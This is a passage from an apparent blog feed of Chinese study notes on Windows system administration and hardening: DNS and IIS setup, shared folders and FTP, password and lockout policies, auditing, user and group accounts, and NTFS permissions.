        <content type="html"><![CDATA[<h1 id="Window系统安全"><a href="#Window系统安全" class="headerlink" title="Window系统安全"></a>Window系统安全</h1><h2 id="DNS概述"><a href="#DNS概述" class="headerlink" title="DNS概述"></a>DNS概述</h2><h3 id="什么是DNS"><a href="#什么是DNS" class="headerlink" title="什么是DNS"></a>什么是DNS</h3><p><strong>什么是DNS</strong></p><ul><li>DNS域名解析系统</li><li>TCP端口53</li></ul><p><strong>为什么需要DNS系统</strong></p><ul><li><a href="http://www.baidu.com与119.75.217.56，哪个更好记？">www.baidu.com与119.75.217.56，哪个更好记？</a></li><li>互联网中的114查号台&#x2F;导航员</li></ul><p><strong>DNS（Domain Name System，域名系统）的功能</strong></p><ul><li>正向解析：根据注册的域名查找对应的IP地址，名字  –&gt;  IP</li><li>反向解析：根据IP地址查找对应的注册域名（相对不常用），IP  –&gt;  名字</li></ul><p><strong>域名解决方案的演进</strong></p><ul><li>早期（本地，hosts文件）C:\Windows\System32\drivers\etc\hosts(主机名解析文件)</li><li>现在（DNS服务器，分布式解析库）</li></ul><p><img src="/../img/img_artical/net_sec/2.4.1.png" alt="2.4.1"></p><h3 id="域名空间结构"><a href="#域名空间结构" class="headerlink" title="域名空间结构"></a>域名空间结构</h3><p><strong>层次化命名</strong></p><p><img src="/../img/img_artical/net_sec/2.4.2.png" alt="2.4.2"></p><p><strong>常见顶级域名</strong></p><ul><li>组织域、国家&#x2F;地区域名</li></ul><table><thead><tr><th align="center">组织域</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">gov</td><td align="center">政府机构</td></tr><tr><td align="center">com</td><td align="center">商业机构</td></tr><tr><td align="center">edu</td><td align="center">教育机构</td></tr><tr><td align="center">org</td><td align="center">民间团体组织</td></tr><tr><td align="center">net</td><td align="center">网络服务机构</td></tr><tr><td align="center">mil</td><td align="center">军事部门</td></tr><tr><td align="center">arpa</td><td align="center">反向域</td></tr></tbody></table><table><thead><tr><th align="center">国家&#x2F;地区域</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">cn</td><td align="center">中国</td></tr><tr><td align="center">hk</td><td align="center">中国香港</td></tr><tr><td align="center">tw</td><td align="center">中国台湾</td></tr><tr><td align="center">us</td><td align="center">美国</td></tr><tr><td align="center">ru</td><td align="center">俄罗斯</td></tr><tr><td align="center">…</td><td align="center">其他</td></tr></tbody></table><h2 id="DNS原理及配置"><a href="#DNS原理及配置" class="headerlink" title="DNS原理及配置"></a>DNS原理及配置</h2><h3 id="查询过程及方式"><a href="#查询过程及方式" class="headerlink" title="查询过程及方式"></a>查询过程及方式</h3><p><strong>客户端  &#x3D;&gt;  缓存DNS  &#x3D;&gt;  权威DNS</strong></p><h3 id="DNS的查询方法"><a href="#DNS的查询方法" class="headerlink" title="DNS的查询方法"></a>DNS的查询方法</h3><p><strong>从查询方式分类</strong></p><ul><li>递归查询</li><li>迭代查询</li></ul><p><strong>从查询内容分类</strong></p><ul><li>正向查询：由域名查找IP地址</li><li>反向查询：由IP地址查找域名</li></ul><h2 id="安装DNS服务"><a href="#安装DNS服务" class="headerlink" title="安装DNS服务"></a>安装DNS服务</h2><h3 id="配置DNS服务"><a href="#配置DNS服务" class="headerlink" title="配置DNS服务"></a>配置DNS服务</h3><p><strong>提供DNS服务的必要条件</strong></p><ul><li>有固定的IP地址</li><li>安装并启动DNS服务</li><li>有区域文件，配置转发器，或者配置根提示</li></ul><h3 id="安装DNS服务器角色"><a href="#安装DNS服务器角色" class="headerlink" title="安装DNS服务器角色"></a>安装DNS服务器角色</h3><ul><li><p>确认服务器已设置固定IP地址（如192.168.10.10)</p></li><li><p>添加  DNS服务器  角色</p></li></ul><p><img src="/../img/img_artical/net_sec/2.4.3.png" alt="2.4.3"></p><h3 id="创建DNS区域"><a href="#创建DNS区域" class="headerlink" title="创建DNS区域"></a>创建DNS区域</h3><p><strong>使用DNS管理器</strong></p><ul><li>Win+R运行dnsmgmt.msc</li><li>新建区域</li></ul><h2 id="配置DNS域名解析"><a href="#配置DNS域名解析" class="headerlink" title="配置DNS域名解析"></a>配置DNS域名解析</h2><h3 id="配置DNS区域解析"><a href="#配置DNS区域解析" class="headerlink" title="配置DNS区域解析"></a>配置DNS区域解析</h3><p><strong>常见资源记录类别</strong></p><table><thead><tr><th align="center">资源记录</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">A（主机）</td><td align="center">此区域中某个“FQDN –&gt; IP地址”的记录</td></tr><tr><td align="center">PTR（指针）</td><td align="center">此区域中某个“IP地址 –&gt; FQDN”的记录</td></tr><tr><td align="center">CNAME（别名）</td><td align="center">将多个名字映射到同一个站点</td></tr></tbody></table><h3 id="DNS正向解析"><a href="#DNS正向解析" class="headerlink" title="DNS正向解析"></a>DNS正向解析</h3><p><strong>配置正向解析</strong></p><ul><li>右击区域名添加创建A记录</li><li>添加A记录内容“www –&gt;  192.168.10.10”</li></ul><h3 id="DNS功能测试"><a href="#DNS功能测试" class="headerlink" title="DNS功能测试"></a>DNS功能测试</h3><p><strong>准备网络环境</strong></p><ul><li>客户端与DNS服务器网络连通</li><li>将客户端首选DNS设为企业自建的DNS</li><li>使用nslookup查询并观察结果</li></ul><p><strong>域名解析测试</strong></p><ul><li>使用nslookup  域名（查询并观察结果）</li></ul><h2 id="IIS概述"><a href="#IIS概述" class="headerlink" title="IIS概述"></a>IIS概述</h2><h3 id="Web服务"><a href="#Web服务" class="headerlink" title="Web服务"></a>Web服务</h3><p><strong>Web服务概述</strong></p><ul><li>服务端：支持HTTP协议的网页提供程序</li><li>浏览器&#x2F;客户端：下载并按标记规范显示网页的浏览器程序</li><li>Http超文本传输协议，端口80</li></ul><p><img src="/../img/img_artical/net_sec/2.4.4.png" alt="2.4.4"></p><h3 id="如何获取网页资源"><a href="#如何获取网页资源" class="headerlink" title="如何获取网页资源"></a>如何获取网页资源</h3><p><strong>URL网页</strong></p><ul><li>Uniform Resource Locator，统一资源定位器</li><li>资源类别：&#x2F;&#x2F;服务器地址&#x2F;目录地址&#x2F;文件名，比如<ul><li><a href="https://www.baidu.com/">https://www.baidu.com/</a></li><li><a href="https://www.bilibili.com/video/BV1Tg4y1C7Sq">https://www.bilibili.com/video/BV1Tg4y1C7Sq</a></li></ul></li></ul><h3 id="常见Web服务端软件"><a href="#常见Web服务端软件" class="headerlink" title="常见Web服务端软件"></a>常见Web服务端软件</h3><ul><li>Microsoft IIS</li><li>Apache HTTP Server</li><li>Nginx</li></ul><h3 id="什么是IIS"><a href="#什么是IIS" class="headerlink" title="什么是IIS"></a>什么是IIS</h3><p><strong>Internet Information Service，互联网信息服务</strong></p><ul><li>微软提供的Web服务产品，集成在Windows操作系统中</li><li>可以通过图形管理工具配置Web&#x2F;FTP服务</li></ul><h2 id="创建WEB站点"><a href="#创建WEB站点" class="headerlink" title="创建WEB站点"></a>创建WEB站点</h2><h3 id="安装Web服务器角色"><a href="#安装Web服务器角色" class="headerlink" title="安装Web服务器角色"></a>安装Web服务器角色</h3><p><strong>服务器管理器</strong></p><ul><li>添加角色和功能</li><li>Web服务器（IIS）</li></ul><p><img src="/../img/img_artical/net_sec/2.4.5.png" alt="2.4.5"></p><h3 id="准备网页文件"><a href="#准备网页文件" class="headerlink" title="准备网页文件"></a>准备网页文件</h3><p>为网站准备网页资料</p><p><img src="/../img/img_artical/net_sec/2.4.6.png" alt="2.4.6"></p><h3 id="配置Web站点"><a href="#配置Web站点" class="headerlink" title="配置Web站点"></a>配置Web站点</h3><p><strong>使用IIS管理器</strong></p><ul><li>Win + R运行inetmgr即可</li></ul><p><img src="/../img/img_artical/net_sec/2.4.7.png" alt="2.4.7"></p><p><strong>创建Web站点</strong></p><ul><li>右击网站–添加网站</li><li>输入网站名，选择物理路径</li></ul><p><img src="/../img/img_artical/net_sec/2.4.8.png" alt="2.4.8"></p><p><strong>配置默认文档的优先级</strong></p><ul><li>即访问此网站目录时，IIS提供给浏览器的第一个文档</li><li>大多数网站将index.html作为首页</li></ul><h3 id="客户端浏览"><a href="#客户端浏览" class="headerlink" title="客户端浏览"></a>客户端浏览</h3><p><strong>http:&#x2F;&#x2F;服务器IP地址</strong></p><p><img src="/../img/img_artical/net_sec/2.4.9.png" alt="2.4.9"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows系统安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-Windows系统安全3</title>
      <link href="/posts/winsec3.html"/>
      <url>/posts/winsec3.html</url>
      
        <content type="html"><![CDATA[<h1 id="Window系统安全"><a href="#Window系统安全" class="headerlink" title="Window系统安全"></a>Window系统安全</h1><h2 id="磁盘分区管理"><a href="#磁盘分区管理" class="headerlink" title="磁盘分区管理"></a>磁盘分区管理</h2><h3 id="磁盘的分区管理"><a href="#磁盘的分区管理" class="headerlink" title="磁盘的分区管理"></a>磁盘的分区管理</h3><p><strong>Win+R运行，执行  diskmgmt.msc  打开磁盘管理</strong></p><ul><li><p>右击分区  &#x3D;&gt;  格式化</p></li><li><p>格式化将清除卷上的所有数据</p></li></ul><h3 id="更改驱动器号"><a href="#更改驱动器号" class="headerlink" title="更改驱动器号"></a>更改驱动器号</h3><p><strong>更改驱动器盘符</strong></p><ul><li>使用驱动器号来表示并访问分区或卷</li></ul><h2 id="发布共享文件夹"><a href="#发布共享文件夹" class="headerlink" title="发布共享文件夹"></a>发布共享文件夹</h2><h3 id="Windows共享概述"><a href="#Windows共享概述" class="headerlink" title="Windows共享概述"></a>Windows共享概述</h3><p><strong>微软公司推出的网络文件&#x2F;打印机服务系统</strong></p><ul><li>可以将一台主机的资源分布给其他主机共用</li><li>共享&#x3D;资源复用</li></ul><p><strong>共享访问的优点</strong></p><ul><li>方便、快捷</li><li>相比光盘&#x2F;U盘不易受文件大小限制</li><li>可以实现访问控制权限</li></ul><h3 id="配置共享文件夹"><a href="#配置共享文件夹" class="headerlink" title="配置共享文件夹"></a>配置共享文件夹</h3><p><strong>右击文件夹  &#x3D;&gt;  共享  &#x3D;&gt;  添加用户  &#x3D;&gt;  分配权限</strong></p><h2 id="访问共享文件夹"><a href="#访问共享文件夹" class="headerlink" title="访问共享文件夹"></a>访问共享文件夹</h2><h3 id="通过UNC路径访问"><a href="#通过UNC路径访问" class="headerlink" title="通过UNC路径访问"></a>通过UNC路径访问</h3><p><strong>UNC（Universal Naming Convention）通用命名规则，快捷访问网络中资源</strong></p><p><strong>以下位置可输入UNC路径</strong></p><ul><li>资源管理器的地址栏</li><li>Win+r，运行框</li></ul><p><strong>UNC路径格式</strong></p><ul><li>\\服务器名\[共享名]</li><li>\\服务器IP\[共享名]</li></ul><h3 id="通过映射网络驱动器访问"><a href="#通过映射网络驱动器访问" class="headerlink" title="通过映射网络驱动器访问"></a>通过映射网络驱动器访问</h3><p><strong>把网络共享资源映射为网络驱动器（盘符），以简化访问步骤，常用于多频次访问场景</strong></p><p><strong>映射网络驱动器</strong></p><ul><li>右击  计算机  或  网络  </li><li>cmd运行，net  use  X:   \\服务器地址\共享名</li></ul><p><strong>断开网络驱动器</strong></p><ul><li>右击网络驱动器，选择  断开</li></ul><h2 id="共享资源管控"><a href="#共享资源管控" class="headerlink" title="共享资源管控"></a>共享资源管控</h2><h3 id="计算机管理-共享文件夹"><a href="#计算机管理-共享文件夹" class="headerlink" title="计算机管理-共享文件夹"></a>计算机管理-共享文件夹</h3><p><strong>管理共享文件夹</strong></p><ul><li>开始  &#x3D;&gt;  管理工具  &#x3D;&gt;  计算机管理  &#x3D;&gt;  系统工具  &#x3D;&gt;  共享文件夹  &#x3D;&gt;  共享</li></ul><p><strong>监控及管理已连接的用户</strong></p><ul><li>开始  &#x3D;&gt;  管理工具  &#x3D;&gt;  计算机管理  &#x3D;&gt;  系统工具  &#x3D;&gt;  共享文件夹  &#x3D;&gt;  会话</li></ul><p><strong>监控及管理被打开的文件</strong></p><ul><li>开始  &#x3D;&gt;  管理工具  &#x3D;&gt;  计算机管理  &#x3D;&gt;  系统工具  &#x3D;&gt;  共享文件夹  &#x3D;&gt;  打开的文件</li></ul><h3 id="特殊共享"><a href="#特殊共享" class="headerlink" title="特殊共享"></a>特殊共享</h3><p><strong>特殊共享</strong></p><ul><li>系统自动建立的用于管理目的的共享文件夹</li></ul><p><strong>主要类别</strong></p><ul><li>Drive letter$</li><li>ADMIN$</li></ul><p><strong>隐藏共享</strong></p><ul><li>共享名$</li></ul><h2 id="FTP服务概述"><a href="#FTP服务概述" class="headerlink" title="FTP服务概述"></a>FTP服务概述</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p><strong>FTP（File Transfer Protocol，文件传输协议）</strong></p><ul><li>是一种用于在网络上进行文件传输的协议</li><li>通俗说就是实现文件共享功能</li></ul><p><strong>基于C&#x2F;S架构的文档下载&#x2F;上传通信</strong></p><ul><li>FTP基于客户端-服务器模型，其中一个计算机作为FTP服务器，而其他计算机作为FTP客户端</li><li>服务端程序：提供文件存储和传输服务</li><li>客户端程序：通过连接到FTP服务器进行文件上传和下载</li></ul><h3 id="FTP服务组件"><a href="#FTP服务组件" class="headerlink" title="FTP服务组件"></a>FTP服务组件</h3><p><strong>Microsoft IIS</strong></p><ul><li>Internet Information Service，互联网信息服务</li><li>微软提供的Web&#x2F;FTP服务产品，集成在Windows操作系统中</li></ul><h2 id="部署FTP服务"><a href="#部署FTP服务" class="headerlink" title="部署FTP服务"></a>部署FTP服务</h2><h3 id="安装FTP服务软件"><a href="#安装FTP服务软件" class="headerlink" title="安装FTP服务软件"></a>安装FTP服务软件</h3><p><strong>安装核心组件</strong></p><ul><li>右击  此电脑  &#x3D;&gt;  管理  &#x3D;&gt;  管理  &#x3D;&gt;  添加角色和功能  &#x3D;&gt;  默认下一步  &#x3D;&gt;  …  &#x3D;&gt;  Web服务器（IIS）  &#x3D;&gt;  添加功能  &#x3D;&gt;  下一步…  &#x3D;&gt;  FTP服务  &#x3D;&gt;  安装</li></ul><p><img src="/../img/img_artical/net_sec/2.3.1.png" alt="2.3.1"></p><h3 id="添加FTP站点"><a href="#添加FTP站点" class="headerlink" title="添加FTP站点"></a>添加FTP站点</h3><p>添加FTP站点，指定站点名及根目录</p><p><img src="/../img/img_artical/net_sec/2.3.2.png" alt="2.3.2"></p><h3 id="FTP身份验证"><a href="#FTP身份验证" class="headerlink" title="FTP身份验证"></a>FTP身份验证</h3><p>FTP支持匿名登录和基本（认证）登录两种身份验证方式</p><ul><li>匿名登录允许用户以匿名身份登录FTP服务器，并访问公共文件</li><li>基本认证登录要求用户提供用户名和密码进行身份验证，只有通过验证的用户才能够访问受限文件</li><li>匿名身份验证，客户端通过资源管理器访问FTP直接登录</li><li>基本身份验证，客户端通过资源管理器访问FTP需输入用户名及密码</li></ul><h3 id="常用FTP客户端软件"><a href="#常用FTP客户端软件" class="headerlink" title="常用FTP客户端软件"></a>常用FTP客户端软件</h3><p>Windows资源管理器</p><ul><li>资源管理器地址栏输入ftp:&#x2F;&#x2F;服务器IP</li></ul><p>专用图形工具</p><ul><li>FileZilla Client、FlashFXP、LeapFTP、CuteFTP</li></ul><p>网页浏览器（仅下载）</p><ul><li>打开浏览器地址栏输入ftp:&#x2F;&#x2F;服务器IP</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows系统安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-Windows系统安全2</title>
      <link href="/posts/winsec2.html"/>
      <url>/posts/winsec2.html</url>
      
        <content type="html"><![CDATA[<h1 id="Window系统安全"><a href="#Window系统安全" class="headerlink" title="Window系统安全"></a>Window系统安全</h1><h2 id="安全基线概述"><a href="#安全基线概述" class="headerlink" title="安全基线概述"></a>安全基线概述</h2><h3 id="操作系统安全基线"><a href="#操作系统安全基线" class="headerlink" title="操作系统安全基线"></a>操作系统安全基线</h3><p><strong>安全基线</strong></p><ul><li>服务器安全基线是为了满足安全规范要求，服务器必须要达到的安全（最低）标准</li></ul><p><strong>主要有以下作用</strong></p><ul><li>设置口令复杂度策略，防止暴力破解密码</li><li>控制用户或文件权限，减少被攻击后的影响</li><li>最小化安装操作系统，防止不必要的服务带来的安全问题</li></ul><p><strong>基线范围</strong></p><ul><li>安全基线在银行、证券、运营商、互联网行业等信息安全领域的应用范围非常广泛</li></ul><p><strong>通常包含以下：</strong></p><ul><li>操作系统</li><li>网络设备</li><li>数据库</li></ul><h3 id="Windows系统安全配置"><a href="#Windows系统安全配置" class="headerlink" title="Windows系统安全配置"></a>Windows系统安全配置</h3><p><strong>安全配置</strong></p><ul><li>用户管理</li><li>密码策略管理</li><li>共享管理</li><li>文件权限管理</li><li>用户权限管理</li><li>日志审核管理</li><li>远程管理</li><li>其他安全选项</li></ul><h2 id="系统账户安全"><a href="#系统账户安全" class="headerlink" title="系统账户安全"></a>系统账户安全</h2><h3 id="本地安全策略"><a href="#本地安全策略" class="headerlink" title="本地安全策略"></a>本地安全策略</h3><p><strong>指的是为保护本计算机资源而配置的规则</strong></p><ul><li>账户策略：密码策略和账户锁定策略</li><li>本地策略：审核策略、用户权限分配、安全选项</li></ul><h3 id="本地安全策略工具"><a href="#本地安全策略工具" class="headerlink" title="本地安全策略工具"></a>本地安全策略工具</h3><p><strong>开始  &#x3D;&gt;  管理工具  &#x3D;&gt;  本地安全策略</strong></p><p><img src="/../img/img_artical/net_sec/2.2.1.png" alt="2.2.1"></p><h3 id="账户策略"><a href="#账户策略" class="headerlink" title="账户策略"></a>账户策略</h3><p><strong>账户策略：控制用户账户如何与计算机交互</strong></p><ul><li>密码策略：确定密码的设置，如密码复杂度和密码长度等</li><li>账户锁定策略：确定账户锁定的条件和时间</li></ul><h3 id="密码策略"><a href="#密码策略" class="headerlink" title="密码策略"></a>密码策略</h3><p><strong>密码必须符合复杂性要求</strong></p><ul><li>不能包含用户的账户名</li><li>包含以下四类字符中的三类字符：大写字母（A到Z），小写字母（a到z），数字（0到9），非字母字符（例如!  $  #  %等）</li></ul><p><strong>密码最小值</strong></p><ul><li>取值范围0-14，0表示无限长度</li></ul><p><strong>密码最长使用期限</strong></p><ul><li>默认42天，取值范围0-999，0表示永不过期</li></ul><p><strong>密码最短使用期限</strong></p><ul><li>取值范围0-998，默认0表示无限制，随时可更改密码</li></ul><p><strong>强制密码历史</strong></p><ul><li>默认0表示历史曾经使用过的密码可以随便使用，取值范围0-24</li></ul><p><strong>测试密码破解的网址：<a href="https://www.security.org/how-secure-is-my-password/"><strong>https://www.security.org/how-secure-is-my-password/</strong></a></strong></p><h3 id="账户锁定策略"><a href="#账户锁定策略" class="headerlink" title="账户锁定策略"></a>账户锁定策略</h3><p><strong>配置账户锁定策略，防止暴力破解攻击</strong></p><p><strong>账户锁定时间</strong></p><ul><li>在自动解锁之前保持锁定的分钟数，取值范围0-99999,0表示永不自动解锁，只能由管理员手动解锁</li></ul><p><strong>账户锁定阈值</strong></p><ul><li>登录尝试失败的次数，取值范围0-999，默认0表示不锁定账户</li></ul><p><strong>重置账户锁定计数器</strong></p><ul><li>多长时间内累加失败次数</li></ul><h2 id="系统审核"><a href="#系统审核" class="headerlink" title="系统审核"></a>系统审核</h2><h3 id="审核策略"><a href="#审核策略" class="headerlink" title="审核策略"></a>审核策略</h3><p><strong>本地策略适用于计算机，包含以下策略：</strong></p><ul><li>审核策略：设置计算机上的安全日志中的日志记录</li><li>用户权限分配：设置用户和组的权限</li><li>安全选项：为计算机指定安全设置</li></ul><p><strong>配置以安全日志的方式记录安全相关事件</strong></p><ul><li>审核策略更改，记录对策略的修改事件</li><li>审核登录事件，记录用户登录成功或失败事件</li><li>审核账户管理，记录用户添加&#x2F;删除&#x2F;重命名&#x2F;禁用&#x2F;启用等事件</li></ul><h2 id="用户权限配置"><a href="#用户权限配置" class="headerlink" title="用户权限配置"></a>用户权限配置</h2><h3 id="用户权限分配"><a href="#用户权限分配" class="headerlink" title="用户权限分配"></a>用户权限分配</h3><p><strong>设置用户和组的权限</strong></p><ul><li>允许通过远程桌面服务登录</li><li>允许本地登录</li><li>拒绝本地登录</li><li>更改系统时间</li><li>备份文件和目录</li></ul><h2 id="安全选项配置"><a href="#安全选项配置" class="headerlink" title="安全选项配置"></a>安全选项配置</h2><h3 id="安全选项策略"><a href="#安全选项策略" class="headerlink" title="安全选项策略"></a>安全选项策略</h3><p><strong>本地策略  &#x3D;&gt;  安全选项</strong></p><ul><li>交互式登录：无需按Ctrl+Alt+Del，默认禁用</li><li>交互式登录：提示用户在密码过期之前更改密码，默认5天</li><li>交互式登录：不显示最后的用户名，默认禁用</li><li>关机：允许系统在未登录的情况下关闭，默认禁用</li></ul><h2 id="账户系统安全加固"><a href="#账户系统安全加固" class="headerlink" title="账户系统安全加固"></a>账户系统安全加固</h2><h3 id="Window账户"><a href="#Window账户" class="headerlink" title="Window账户"></a>Window账户</h3><p><strong>多用户系统</strong></p><ul><li>Windows不应只有一个管理员账户、应根据业备需求，设定不同的用户和用户组，如管理员账户、Web用户、数据库用户</li></ul><p><strong>定期检查用户，删除无用、过期的账户</strong></p><ul><li>应保证所有用户均为有效且在用</li></ul><p><strong>禁用Guest账户</strong></p><ul><li>系统应禁用Guest账户，Guest账户默认不开启</li></ul><h3 id="Windows账户管理"><a href="#Windows账户管理" class="headerlink" title="Windows账户管理"></a>Windows账户管理</h3><p><strong>账户管理</strong></p><ul><li>更改默认管理员账户名称（应更改默认管理员administrator的名称，防止暴力破解等问题）</li><li>不显示最后的用户名（用户登出后，下次登录时，不应显示上次登录用户的名称）</li></ul><p><strong>检测方法</strong></p><ul><li>控制面板  &#x3D;&gt;  系统和安全  &#x3D;&gt;  管理工具  &#x3D;&gt;  计算机管理</li><li>控制面板  &#x3D;&gt;  系统和安全  &#x3D;&gt;  管理工具  &#x3D;&gt;  本地安全策略</li></ul><h3 id="查看账户"><a href="#查看账户" class="headerlink" title="查看账户"></a>查看账户</h3><p><strong>查看系统当前账户</strong></p><ul><li>打开cmd查看当前账户</li><li>开始  &#x3D;&gt;  控制面板  &#x3D;&gt;  管理工具  &#x3D;&gt;  计算机管理，进入本地用户和组，查看用户</li><li>打开注册表，查看用户和组</li></ul><p><strong>以管理员登录，进入命令提示环境查看用户</strong></p><ul><li>运行cmd</li><li>net user</li></ul><p><strong>打开注册表查看用户</strong></p><ul><li>运行regedit</li><li>HKEY_LOCAL_MACHINE&#x2F;SAM&#x2F;SAM&#x2F;Domains&#x2F;Account&#x2F;Users&#x2F;</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows系统安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-Windows系统安全1</title>
      <link href="/posts/winsec1.html"/>
      <url>/posts/winsec1.html</url>
      
        <content type="html"><![CDATA[<h1 id="Window系统安全"><a href="#Window系统安全" class="headerlink" title="Window系统安全"></a>Window系统安全</h1><h2 id="用户账户基础"><a href="#用户账户基础" class="headerlink" title="用户账户基础"></a>用户账户基础</h2><h3 id="用户账户概述"><a href="#用户账户概述" class="headerlink" title="用户账户概述"></a>用户账户概述</h3><p><strong>用户账户用来记录用户的用户名和口令、隶属的组等信息</strong></p><ul><li>每个用户账户包含唯一的登录名和对应的密码</li><li>不同的用户身份拥有不同的权限</li></ul><p><strong>操作系统根据SID识别不同用户</strong></p><ul><li>每个用户拥有唯一安全标识符（SID）</li><li>用户权限通过用户的SID来记录</li><li>查看命令为：whoami &#x2F;user</li></ul><p><img src="/../img/img_artical/net_sec/2.1.1.png" alt="2.1.1"></p><h3 id="本地用户和组控制台"><a href="#本地用户和组控制台" class="headerlink" title="本地用户和组控制台"></a>本地用户和组控制台</h3><p><strong>运行  lusrmgr.msc   ，直接打开   本地用户和组，</strong></p><ul><li>或者右击  开始  &#x3D;&gt;  计算机管理  &#x3D;&gt;  系统工具  &#x3D;&gt;  本地用户和组</li></ul><p><img src="/../img/img_artical/net_sec/2.1.2.png" alt="2.1.2"></p><h3 id="内置用户"><a href="#内置用户" class="headerlink" title="内置用户"></a>内置用户</h3><p><strong>Windows系统默认存在的系统</strong></p><ul><li>Administrator：管理员（权限最大）</li><li>Guest：来宾（权限最小），默认禁用</li></ul><p><font color="#ff0000"><strong>内置用户可以改名、禁用，但无法删除</strong></font></p><h2 id="用户账号操作"><a href="#用户账号操作" class="headerlink" title="用户账号操作"></a>用户账号操作</h2><h3 id="用户管理操作"><a href="#用户管理操作" class="headerlink" title="用户管理操作"></a>用户管理操作</h3><p><strong>创建新用户</strong></p><ul><li>右击空白处，选   新用户</li><li>指定用户名、密码及密码属性</li></ul><p><strong>账户属性</strong></p><ul><li><p>用户下次登录时须更改密码（每个员工创建不同帐户）</p></li><li><p>用户不能更改密码（用于公用帐户）</p></li><li><p>密码永不过期（默认42天）</p></li><li><p>帐户已禁用</p></li></ul><p><img src="/../img/img_artical/net_sec/2.1.3.png" alt="2.1.3"></p><p><strong>更改用户属性</strong></p><ul><li>常规属性、是否禁用、隶属于</li></ul><p><strong>设置密码</strong></p><ul><li>选中用户，右击选  设置密码</li></ul><p><img src="/../img/img_artical/net_sec/2.1.4.png" alt="2.1.4"></p><p><strong>重命名用户</strong></p><ul><li>适用于工作交接场合</li><li>由管理员将前任员工的账户改名</li></ul><p><strong>删除用户</strong></p><ul><li>适用于员工离职&#x2F;账户废止等场合</li></ul><p><font color="#ff0000"><strong>建议禁用账户而不是删除，若删除后重建同名账户，其SID值会不同</strong></font></p><h2 id="组账号基础"><a href="#组账号基础" class="headerlink" title="组账号基础"></a>组账号基础</h2><h3 id="组账户概述"><a href="#组账户概述" class="headerlink" title="组账户概述"></a>组账户概述</h3><p><strong>用来为多个用户批量授权</strong></p><ul><li>为一个组授予权限后，所有成员用户自动获得相应权限</li><li>用户加入一个组，自动获得此组的权限</li></ul><h3 id="创建新的组账号"><a href="#创建新的组账号" class="headerlink" title="创建新的组账号"></a>创建新的组账号</h3><p><strong>打开本地用户和组  &#x3D;&gt;  组  &#x3D;&gt;  右击  &#x3D;&gt;  新建组  &#x3D;&gt;  输入组名  &#x3D;&gt;  创建</strong></p><p><img src="/../img/img_artical/net_sec/2.1.5.png" alt="2.1.5"></p><h3 id="管理组成员"><a href="#管理组成员" class="headerlink" title="管理组成员"></a>管理组成员</h3><ul><li><p>双击本地组  &#x3D;&gt;  添加  &#x3D;&gt;  输入用户名  &#x3D;&gt;  确定  &#x3D;&gt;  确定</p></li><li><p>或者右击用户名  &#x3D;&gt;  属性  &#x3D;&gt;  隶属于  &#x3D;&gt;  输入组名  +&gt;  确定  &#x3D;&gt;  确定</p></li></ul><p><img src="/../img/img_artical/net_sec/2.1.6.png" alt="2.1.6"></p><h2 id="内置组账号管理"><a href="#内置组账号管理" class="headerlink" title="内置组账号管理"></a>内置组账号管理</h2><h3 id="内置组账号"><a href="#内置组账号" class="headerlink" title="内置组账号"></a>内置组账号</h3><p><strong>常用的内置组</strong></p><ul><li><p>Administrators:管理员组</p></li><li><p>Guests:来宾组</p></li><li><p>Network Configuration Operators：具有管理网络功能，例如更改IP地址</p></li><li><p>Backup Operators：具有备份和还原的权限</p></li><li><p>Remote Desktop Users：此组内用户可以从远程计算机使用远程桌面来连接</p></li><li><p>Print Operators：具有管理打印机的权限</p></li><li><p>Users:新用户默认组</p></li><li><p>Authenticated Users:任何有效登录的的用户都属于此组</p></li><li><p>Everyone:任何用户都属此组</p></li></ul><h2 id="NTFS权限基础"><a href="#NTFS权限基础" class="headerlink" title="NTFS权限基础"></a>NTFS权限基础</h2><h3 id="什么是文件系统"><a href="#什么是文件系统" class="headerlink" title="什么是文件系统"></a>什么是文件系统</h3><p><strong>基本作用</strong></p><ul><li>定义向磁盘上存文档的方法和数据结构，以及读文档的规则</li><li>格式化操作就是建新的文件系统</li></ul><p><strong>Windows常见的文件系统</strong></p><ul><li>FAT32，文件分配表</li><li>NTFS，新技术文件系统</li><li>ReFS，复原文件系统</li></ul><h3 id="NTFS文件系统的优点"><a href="#NTFS文件系统的优点" class="headerlink" title="NTFS文件系统的优点"></a>NTFS文件系统的优点</h3><ul><li>高读写：提高磁盘读写性能</li><li>可靠性：加密、访问控制列表</li><li>磁盘利用率：压缩、磁盘配额</li><li>大容量：最大可支持16EB</li><li>AD需要NTFS支持</li></ul><p><strong>如何获取NTFS文件系统的分区：</strong></p><ul><li>右击此电脑  &#x3D;&gt;  管理  &#x3D;&gt;  工具  &#x3D;&gt;  计算机管理  &#x3D;&gt;  磁盘管理  &#x3D;&gt;  格式化对应的分区</li></ul><h3 id="文件夹的NTFS权限"><a href="#文件夹的NTFS权限" class="headerlink" title="文件夹的NTFS权限"></a>文件夹的NTFS权限</h3><p><strong>目录操作权限</strong></p><ul><li>完全控制：可执行所有操作</li><li>修改：可修改、删除</li><li>读取和执行：可读取、执行</li><li>列出文件夹内容</li><li>读取：可读取内容</li><li>写入：可创建文件夹或者文件</li><li>特殊权限：调整“安全”设置的权限</li></ul><p><strong>文件操作权限</strong></p><ul><li>完全控制：可执行所有操作</li><li>修改：可修改、删除</li><li>读取和执行：可读取、执行</li><li>读取：可读取内容</li><li>写入：可创建文件夹或者文件</li><li>特殊权限：调整“安全”设置的权限</li></ul><p><strong><font color="ff0000">文件的NTFS权限与文件夹的NTFS权限对比少了一个列出文件夹内容的权限</font></strong></p><h2 id="NTFS权限应用规则"><a href="#NTFS权限应用规则" class="headerlink" title="NTFS权限应用规则"></a>NTFS权限应用规则</h2><h3 id="文档的NTFS选项设置"><a href="#文档的NTFS选项设置" class="headerlink" title="文档的NTFS选项设置"></a>文档的NTFS选项设置</h3><ul><li><p>右击指定的目录或文件  